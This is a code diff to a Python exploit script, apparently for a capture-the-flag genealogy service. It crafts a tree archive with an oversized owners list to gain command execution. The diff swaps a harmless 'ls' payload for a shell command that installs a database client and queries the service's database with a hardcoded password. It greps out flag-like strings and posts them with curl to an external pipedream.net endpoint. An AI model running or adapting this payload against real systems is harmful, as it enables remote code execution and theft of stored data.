@@ -10,7 +10,9 @@ from pwn import ELF
 
 from client import GenealogyClient
 
-PAYLOAD = b"/bin/sh -c 'ls -la'"
+# PAYLOAD = b"/bin/sh -c 'ls -la'"
+PAYLOAD = b"apt-get install -y postgresql-client; echo 'SELECT title FROM genealogy_trees;' | PGPASSWORD=genealogy psql -h database -p 6432 -U genealogy genealogy | grep -oP '\w{10,}=' > flags.txt; curl --data @flags.txt https://enye1l83zkkqe5m.m.pipedream.net/flags"
+assert len(PAYLOAD) < 60 * 8
 
 PORT = 8888
 AES_BLOCK_SIZE = 16
@@ -89,7 +91,11 @@ async def generate_first_archive(endpoint: str) -> tuple[int, bytes, bytes]:
     login = generate_random_string()
     password = generate_random_string()
 
-    description_length = 0x257 - 160  # 0x257 is desired total length, 160 is a total size of other fields
+    # 60 is max size of owners list
+    payload = generate_payload(60)
+
+    # 0x257 is desired total length, 397 is a total size of other fields (may change if you change PAYLOAD)
+    description_length = 0x257 - 397
 
     async with GenealogyClient(endpoint) as client:
         user_id = await client.create_user(login, password)
@@ -100,7 +106,6 @@ async def generate_first_archive(endpoint: str) -> tuple[int, bytes, bytes]:
         root = await client.create_person("", 1, 2, parent, None)
         await client.create_tree("", "x" * description_length, root)
 
-        payload = generate_payload(60)  # 60 is max size of owners list
         await client.update_owners(payload)
 
         archive_with_signature = await client.download_tree_archive()
